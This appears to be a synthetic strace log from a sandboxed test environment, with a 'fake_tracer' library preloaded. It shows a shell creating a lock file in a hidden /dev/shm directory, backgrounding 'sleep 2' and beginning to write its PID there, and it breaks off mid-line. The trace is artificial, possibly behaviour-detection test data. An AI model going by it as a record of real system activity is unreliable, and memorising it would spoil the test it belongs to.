9     10:07:55.292240 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/touch", {st_mode=S_IFREG|0755, st_size=96776, ...}, 0) = 0
9     10:07:55.292652 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/touch", {st_mode=S_IFREG|0755, st_size=96776, ...}, 0) = 0
9     10:07:55.293201 geteuid()         = 1001
9     10:07:55.293647 getegid()         = 1001
9     10:07:55.294009 getuid()          = 1001
9     10:07:55.294369 getgid()          = 1001
9     10:07:55.294767 access("/usr/bin/touch", X_OK) = 0
9     10:07:55.295237 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/touch", {st_mode=S_IFREG|0755, st_size=96776, ...}, 0) = 0
9     10:07:55.295725 geteuid()         = 1001
9     10:07:55.296170 getegid()         = 1001
9     10:07:55.296597 getuid()          = 1001
9     10:07:55.296951 getgid()          = 1001
9     10:07:55.297307 access("/usr/bin/touch", R_OK) = 0
9     10:07:55.297695 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9     10:07:55.298055 rt_sigprocmask(SIG_BLOCK, [INT TERM CHLD], [], 8) = 0
9     10:07:55.298410 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7201ca25fe50) = 20
9     10:07:55.299298 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
20    10:07:55.299657 set_robust_list(0x7201ca25fe60, 24 <unfinished ...>
9     10:07:55.299927 <... rt_sigprocmask resumed>NULL, 8) = 0
20    10:07:55.300220 <... set_robust_list resumed>) = 0
9     10:07:55.300511 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
20    10:07:55.300790 getpid( <unfinished ...>
9     10:07:55.300966 <... rt_sigprocmask resumed>[], 8) = 0
20    10:07:55.301132 <... getpid resumed>) = 20
9     10:07:55.301357 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
20    10:07:55.301603 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
9     10:07:55.301786 <... rt_sigprocmask resumed>NULL, 8) = 0
20    10:07:55.301951 <... rt_sigprocmask resumed>NULL, 8) = 0
9     10:07:55.302114 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
20    10:07:55.302281 rt_sigaction(SIGTSTP, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330},  <unfinished ...>
9     10:07:55.302447 <... rt_sigprocmask resumed>[], 8) = 0
20    10:07:55.302614 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
9     10:07:55.302779 rt_sigaction(SIGINT, {sa_handler=0x5dc4659d8750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330},  <unfinished ...>
20    10:07:55.302947 rt_sigaction(SIGTTIN, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330},  <unfinished ...>
9     10:07:55.303112 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
20    10:07:55.303269 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
9     10:07:55.303424 wait4(-1,  <unfinished ...>
20    10:07:55.303572 rt_sigaction(SIGTTOU, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
20    10:07:55.303944 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
20    10:07:55.304294 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
20    10:07:55.304643 rt_sigaction(SIGCHLD, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7201ca2a6330}, {sa_handler=0x5dc4659d6230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7201ca2a6330}, 8) = 0
20    10:07:55.305077 execve("/usr/bin/touch", ["touch", "/dev/shm/.cache_bak/update.lock"], 0x5dc497af3550 /* 8 vars */) = 0
20    10:07:55.306024 brk(NULL)         = 0x56f0b34a3000
20    10:07:55.306651 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7c4624dad000
20    10:07:55.307176 openat(AT_FDCWD</sandbox>, "/lib/libfake_tracer.so", O_RDONLY|O_CLOEXEC) = 3</usr/lib/libfake_tracer.so>
20    10:07:55.308078 read(3</usr/lib/libfake_tracer.so>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
20    10:07:55.308730 fstat(3</usr/lib/libfake_tracer.so>, {st_mode=S_IFREG|0755, st_size=16376, ...}) = 0
20    10:07:55.309639 mmap(NULL, 19160, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0) = 0x7c4624da8000
20    10:07:55.310081 mmap(0x7c4624da9000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x1000) = 0x7c4624da9000
20    10:07:55.310464 mmap(0x7c4624daa000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000) = 0x7c4624daa000
20    10:07:55.310835 mmap(0x7c4624dab000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000) = 0x7c4624dab000
20    10:07:55.311222 close(3</usr/lib/libfake_tracer.so>) = 0
20    10:07:55.311635 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
20    10:07:55.312048 openat(AT_FDCWD</sandbox>, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3</etc/ld.so.cache>
20    10:07:55.312558 fstat(3</etc/ld.so.cache>, {st_mode=S_IFREG|0644, st_size=7295, ...}) = 0
20    10:07:55.312957 mmap(NULL, 7295, PROT_READ, MAP_PRIVATE, 3</etc/ld.so.cache>, 0) = 0x7c4624da6000
20    10:07:55.313330 close(3</etc/ld.so.cache>) = 0
20    10:07:55.313700 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libc.so.6>
20    10:07:55.314095 read(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\220\243\2\0\0\0\0\0"..., 832) = 832
20    10:07:55.314452 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
20    10:07:55.314799 fstat(3</usr/lib/x86_64-linux-gnu/libc.so.6>, {st_mode=S_IFREG|0755, st_size=2125328, ...}) = 0
20    10:07:55.315144 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
20    10:07:55.315772 mmap(NULL, 2170256, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0) = 0x7c4624b94000
20    10:07:55.316576 mmap(0x7c4624bbc000, 1605632, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x28000) = 0x7c4624bbc000
20    10:07:55.317319 mmap(0x7c4624d44000, 323584, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1b0000) = 0x7c4624d44000
20    10:07:55.317893 mmap(0x7c4624d93000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1fe000) = 0x7c4624d93000
20    10:07:55.318472 mmap(0x7c4624d99000, 52624, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7c4624d99000
20    10:07:55.318943 close(3</usr/lib/x86_64-linux-gnu/libc.so.6>) = 0
20    10:07:55.319331 mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7c4624b91000
20    10:07:55.319713 arch_prctl(ARCH_SET_FS, 0x7c4624b91740) = 0
20    10:07:55.320075 set_tid_address(0x7c4624b91a10) = 20
20    10:07:55.320513 set_robust_list(0x7c4624b91a20, 24) = 0
20    10:07:55.320860 rseq(0x7c4624b92060, 0x20, 0, 0x53053053) = 0
20    10:07:55.321308 mprotect(0x7c4624d93000, 16384, PROT_READ) = 0
20    10:07:55.321693 mprotect(0x7c4624dab000, 4096, PROT_READ) = 0
20    10:07:55.322104 mprotect(0x56f09dc55000, 4096, PROT_READ) = 0
20    10:07:55.322465 mprotect(0x7c4624de5000, 8192, PROT_READ) = 0
20    10:07:55.322849 prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
20    10:07:55.323225 munmap(0x7c4624da6000, 7295) = 0
20    10:07:55.323623 getrandom("\x04\xa1\xe3\x9b\x95\xf9\x79\xa3", 8, GRND_NONBLOCK) = 8
20    10:07:55.323984 brk(NULL)         = 0x56f0b34a3000
20    10:07:55.324374 brk(0x56f0b34c4000) = 0x56f0b34c4000
20    10:07:55.324848 openat(AT_FDCWD</sandbox>, "/dev/shm/.cache_bak/update.lock", O_WRONLY|O_CREAT|O_NOCTTY|O_NONBLOCK, 000) = 3</dev/shm/.cache_bak/update.lock>
20    10:07:55.325530 dup2(3</dev/shm/.cache_bak/update.lock>, 0<pipe:[79132]>) = 0</dev/shm/.cache_bak/update.lock>
20    10:07:55.325990 close(3</dev/shm/.cache_bak/update.lock>) = 0
20    10:07:55.326352 utimensat(0</dev/shm/.cache_bak/update.lock>, NULL, NULL, 0) = 0
20    10:07:55.326751 close(0</dev/shm/.cache_bak/update.lock>) = 0
20    10:07:55.327122 close(1<pipe:[78065]>) = 0
20    10:07:55.327662 close(2<pipe:[78066]>) = 0
20    10:07:55.328076 exit_group(0)     = ?
20    10:07:55.328905 +++ exited with 0 +++
9     10:07:55.329137 <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 20
9     10:07:55.329433 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, {sa_handler=0x5dc4659d8750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
9     10:07:55.330012 ioctl(2<pipe:[78066]>, TIOCGWINSZ, 0x7ffe4bfa9910) = -1 ENOTTY (Inappropriate ioctl for device)
9     10:07:55.330493 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9     10:07:55.330860 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=20, si_uid=1001, si_status=0, si_utime=0, si_stime=0} ---
9     10:07:55.331048 wait4(-1, 0x7ffe4bfa9290, WNOHANG, NULL) = -1 ECHILD (No child processes)
9     10:07:55.331403 rt_sigreturn({mask=[]}) = 0
9     10:07:55.331774 read(0<pipe:[79132]>, "\n", 1) = 1
9     10:07:55.332296 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.333177 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.333695 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.334097 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.334508 read(0<pipe:[79132]>, "#", 1) = 1
9     10:07:55.334878 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.335251 read(0<pipe:[79132]>, "B", 1) = 1
9     10:07:55.335623 read(0<pipe:[79132]>, "a", 1) = 1
9     10:07:55.335995 read(0<pipe:[79132]>, "c", 1) = 1
9     10:07:55.336465 read(0<pipe:[79132]>, "k", 1) = 1
9     10:07:55.336839 read(0<pipe:[79132]>, "g", 1) = 1
9     10:07:55.337357 read(0<pipe:[79132]>, "r", 1) = 1
9     10:07:55.338011 read(0<pipe:[79132]>, "o", 1) = 1
9     10:07:55.338717 read(0<pipe:[79132]>, "u", 1) = 1
9     10:07:55.339181 read(0<pipe:[79132]>, "n", 1) = 1
9     10:07:55.339558 read(0<pipe:[79132]>, "d", 1) = 1
9     10:07:55.339929 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.340413 read(0<pipe:[79132]>, "s", 1) = 1
9     10:07:55.340785 read(0<pipe:[79132]>, "l", 1) = 1
9     10:07:55.341155 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.341559 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.341929 read(0<pipe:[79132]>, "p", 1) = 1
9     10:07:55.342298 read(0<pipe:[79132]>, ",", 1) = 1
9     10:07:55.342666 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.343035 read(0<pipe:[79132]>, "r", 1) = 1
9     10:07:55.343408 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.343754 read(0<pipe:[79132]>, "c", 1) = 1
9     10:07:55.344195 read(0<pipe:[79132]>, "o", 1) = 1
9     10:07:55.344565 read(0<pipe:[79132]>, "r", 1) = 1
9     10:07:55.344945 read(0<pipe:[79132]>, "d", 1) = 1
9     10:07:55.345320 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.345662 read(0<pipe:[79132]>, "P", 1) = 1
9     10:07:55.346057 read(0<pipe:[79132]>, "I", 1) = 1
9     10:07:55.346428 read(0<pipe:[79132]>, "D", 1) = 1
9     10:07:55.346799 read(0<pipe:[79132]>, "\n", 1) = 1
9     10:07:55.347173 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.347528 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.347874 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.348777 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.349546 read(0<pipe:[79132]>, "s", 1) = 1
9     10:07:55.350291 read(0<pipe:[79132]>, "l", 1) = 1
9     10:07:55.350900 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.351353 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.351806 read(0<pipe:[79132]>, "p", 1) = 1
9     10:07:55.352416 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.352900 read(0<pipe:[79132]>, "2", 1) = 1
9     10:07:55.353504 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.354118 read(0<pipe:[79132]>, "&", 1) = 1
9     10:07:55.354631 read(0<pipe:[79132]>, "\n", 1) = 1
9     10:07:55.355047 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9     10:07:55.355414 rt_sigprocmask(SIG_BLOCK, [INT TERM CHLD], [], 8) = 0
9     10:07:55.355799 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7201ca25fe50) = 21
9     10:07:55.356679 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
21    10:07:55.356900 set_robust_list(0x7201ca25fe60, 24 <unfinished ...>
9     10:07:55.357136 <... rt_sigprocmask resumed>NULL, 8) = 0
21    10:07:55.357330 <... set_robust_list resumed>) = 0
9     10:07:55.357536 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
21    10:07:55.357801 getpid( <unfinished ...>
9     10:07:55.357977 <... rt_sigprocmask resumed>[], 8) = 0
21    10:07:55.358185 <... getpid resumed>) = 21
9     10:07:55.358409 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
21    10:07:55.358668 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
9     10:07:55.358867 <... rt_sigprocmask resumed>[CHLD], 8) = 0
21    10:07:55.359050 <... rt_sigprocmask resumed>NULL, 8) = 0
9     10:07:55.359282 rt_sigprocmask(SIG_SETMASK, [CHLD],  <unfinished ...>
21    10:07:55.359581 rt_sigaction(SIGTSTP, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330},  <unfinished ...>
9     10:07:55.359769 <... rt_sigprocmask resumed>NULL, 8) = 0
21    10:07:55.359957 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
9     10:07:55.360199 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
21    10:07:55.360414 rt_sigaction(SIGTTIN, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330},  <unfinished ...>
9     10:07:55.360633 <... rt_sigprocmask resumed>[CHLD], 8) = 0
21    10:07:55.360858 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
9     10:07:55.361070 rt_sigprocmask(SIG_SETMASK, [CHLD],  <unfinished ...>
21    10:07:55.361262 rt_sigaction(SIGTTOU, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330},  <unfinished ...>
9     10:07:55.361479 <... rt_sigprocmask resumed>NULL, 8) = 0
21    10:07:55.361707 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
9     10:07:55.361887 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
21    10:07:55.362084 newfstatat(AT_FDCWD</sandbox>, ".",  <unfinished ...>
9     10:07:55.362276 <... rt_sigprocmask resumed>[CHLD], 8) = 0
21    10:07:55.362499 <... newfstatat resumed>{st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
9     10:07:55.362666 rt_sigprocmask(SIG_SETMASK, [CHLD],  <unfinished ...>
21    10:07:55.362845 newfstatat(AT_FDCWD</sandbox>, "/usr/local/sbin/sleep",  <unfinished ...>
9     10:07:55.363014 <... rt_sigprocmask resumed>NULL, 8) = 0
21    10:07:55.363175 <... newfstatat resumed>0x7ffe4bfa95d0, 0) = -1 ENOENT (No such file or directory)
9     10:07:55.363342 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
21    10:07:55.363519 newfstatat(AT_FDCWD</sandbox>, "/usr/local/bin/sleep",  <unfinished ...>
9     10:07:55.363691 <... rt_sigprocmask resumed>NULL, 8) = 0
21    10:07:55.363896 <... newfstatat resumed>0x7ffe4bfa95d0, 0) = -1 ENOENT (No such file or directory)
9     10:07:55.364190 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.364456 newfstatat(AT_FDCWD</sandbox>, "/usr/sbin/sleep",  <unfinished ...>
9     10:07:55.364635 <... read resumed>" ", 1) = 1
21    10:07:55.364804 <... newfstatat resumed>0x7ffe4bfa95d0, 0) = -1 ENOENT (No such file or directory)
9     10:07:55.364988 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.365153 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/sleep",  <unfinished ...>
9     10:07:55.365329 <... read resumed>" ", 1) = 1
21    10:07:55.365616 <... newfstatat resumed>{st_mode=S_IFREG|0755, st_size=35336, ...}, 0) = 0
9     10:07:55.365864 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.366216 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/sleep",  <unfinished ...>
9     10:07:55.366499 <... read resumed>" ", 1) = 1
21    10:07:55.366793 <... newfstatat resumed>{st_mode=S_IFREG|0755, st_size=35336, ...}, 0) = 0
9     10:07:55.367061 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.367321 geteuid( <unfinished ...>
9     10:07:55.367504 <... read resumed>" ", 1) = 1
21    10:07:55.367732 <... geteuid resumed>) = 1001
9     10:07:55.367908 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.368090 getegid( <unfinished ...>
9     10:07:55.368320 <... read resumed>"e", 1) = 1
21    10:07:55.368499 <... getegid resumed>) = 1001
9     10:07:55.368669 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.368865 getuid( <unfinished ...>
9     10:07:55.369038 <... read resumed>"c", 1) = 1
21    10:07:55.369238 <... getuid resumed>) = 1001
9     10:07:55.369411 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.369594 getgid( <unfinished ...>
9     10:07:55.369747 <... read resumed>"h", 1) = 1
21    10:07:55.369997 <... getgid resumed>) = 1001
9     10:07:55.370152 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.370347 access("/usr/bin/sleep", X_OK <unfinished ...>
9     10:07:55.370519 <... read resumed>"o", 1) = 1
21    10:07:55.370738 <... access resumed>) = 0
9     10:07:55.370945 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.371133 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/sleep",  <unfinished ...>
9     10:07:55.371353 <... read resumed>" ", 1) = 1
21    10:07:55.371609 <... newfstatat resumed>{st_mode=S_IFREG|0755, st_size=35336, ...}, 0) = 0
9     10:07:55.371802 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.371980 geteuid( <unfinished ...>
9     10:07:55.372199 <... read resumed>" ", 1) = 1
21    10:07:55.372404 <... geteuid resumed>) = 1001
9     10:07:55.372621 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.372813 getegid( <unfinished ...>
9     10:07:55.373026 <... read resumed>">", 1) = 1
21    10:07:55.373270 <... getegid resumed>) = 1001
9     10:07:55.373466 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.373675 getuid( <unfinished ...>
9     10:07:55.373894 <... read resumed>" ", 1) = 1
21    10:07:55.374130 <... getuid resumed>) = 1001
9     10:07:55.374344 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.374570 getgid( <unfinished ...>
9     10:07:55.374781 <... read resumed>"/", 1) = 1
21    10:07:55.374977 <... getgid resumed>) = 1001
9     10:07:55.375203 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.375405 access("/usr/bin/sleep", R_OK <unfinished ...>
9     10:07:55.375644 <... read resumed>"d", 1) = 1
21    10:07:55.375836 <... access resumed>) = 0
9     10:07:55.376041 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.376334 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330},  <unfinished ...>
9     10:07:55.376544 <... read resumed>"e", 1) = 1
21    10:07:55.376730 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
9     10:07:55.376952 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.377189 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330},  <unfinished ...>
9     10:07:55.377377 <... read resumed>"v", 1) = 1
21    10:07:55.377551 <... rt_sigaction resumed>{sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
9     10:07:55.377735 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.377904 rt_sigaction(SIGCHLD, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7201ca2a6330},  <unfinished ...>
9     10:07:55.378112 <... read resumed>"/", 1) = 1
21    10:07:55.378276 <... rt_sigaction resumed>{sa_handler=0x5dc4659d6230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7201ca2a6330}, 8) = 0
9     10:07:55.378449 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.378614 openat(AT_FDCWD</sandbox>, "/dev/null", O_RDONLY <unfinished ...>
9     10:07:55.378807 <... read resumed>"s", 1) = 1
21    10:07:55.378996 <... openat resumed>) = 3</dev/null>
9     10:07:55.379172 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.379335 dup2(3</dev/null>, 0<pipe:[79132]> <unfinished ...>
9     10:07:55.379514 <... read resumed>"h", 1) = 1
21    10:07:55.379699 <... dup2 resumed>) = 0</dev/null>
9     10:07:55.379865 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.380130 close(3</dev/null> <unfinished ...>
9     10:07:55.380444 <... read resumed>"m", 1) = 1
21    10:07:55.380720 <... close resumed>) = 0
9     10:07:55.380911 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.381100 rt_sigaction(SIGINT, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330},  <unfinished ...>
9     10:07:55.381260 <... read resumed>"/", 1) = 1
21    10:07:55.381445 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
9     10:07:55.381625 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.381787 rt_sigaction(SIGQUIT, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330},  <unfinished ...>
9     10:07:55.381948 <... read resumed>".", 1) = 1
21    10:07:55.382237 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
9     10:07:55.382530 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.382867 execve("/usr/bin/sleep", ["sleep", "2"], 0x5dc497af7160 /* 8 vars */ <unfinished ...>
9     10:07:55.383130 <... read resumed>"c", 1) = 1
9     10:07:55.383430 read(0<pipe:[79132]>, "a", 1) = 1
21    10:07:55.383945 <... execve resumed>) = 0
9     10:07:55.384220 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.384449 brk(NULL <unfinished ...>
9     10:07:55.384626 <... read resumed>"c", 1) = 1
21    10:07:55.384838 <... brk resumed>) = 0x58fb17387000
9     10:07:55.385053 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.385284 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0 <unfinished ...>
9     10:07:55.385487 <... read resumed>"h", 1) = 1
21    10:07:55.385708 <... mmap resumed>) = 0x7a2c60e88000
9     10:07:55.385919 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.386104 openat(AT_FDCWD</sandbox>, "/lib/libfake_tracer.so", O_RDONLY|O_CLOEXEC <unfinished ...>
9     10:07:55.386306 <... read resumed>"e", 1) = 1
9     10:07:55.386571 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.386824 <... openat resumed>) = 3</usr/lib/libfake_tracer.so>
9     10:07:55.387091 <... read resumed>"_", 1) = 1
21    10:07:55.387340 read(3</usr/lib/libfake_tracer.so>,  <unfinished ...>
9     10:07:55.387536 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.387768 <... read resumed>"\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
9     10:07:55.388006 <... read resumed>"b", 1) = 1
21    10:07:55.388331 fstat(3</usr/lib/libfake_tracer.so>,  <unfinished ...>
9     10:07:55.388519 read(0<pipe:[79132]>, "a", 1) = 1
21    10:07:55.389095 <... fstat resumed>{st_mode=S_IFREG|0755, st_size=16376, ...}) = 0
9     10:07:55.389315 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.389558 mmap(NULL, 19160, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0 <unfinished ...>
9     10:07:55.389743 <... read resumed>"k", 1) = 1
21    10:07:55.389918 <... mmap resumed>) = 0x7a2c60e83000
9     10:07:55.390075 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.390257 mmap(0x7a2c60e84000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x1000 <unfinished ...>
9     10:07:55.390447 <... read resumed>"/", 1) = 1
21    10:07:55.390625 <... mmap resumed>) = 0x7a2c60e84000
9     10:07:55.390862 read(0<pipe:[79132]>,  <unfinished ...>
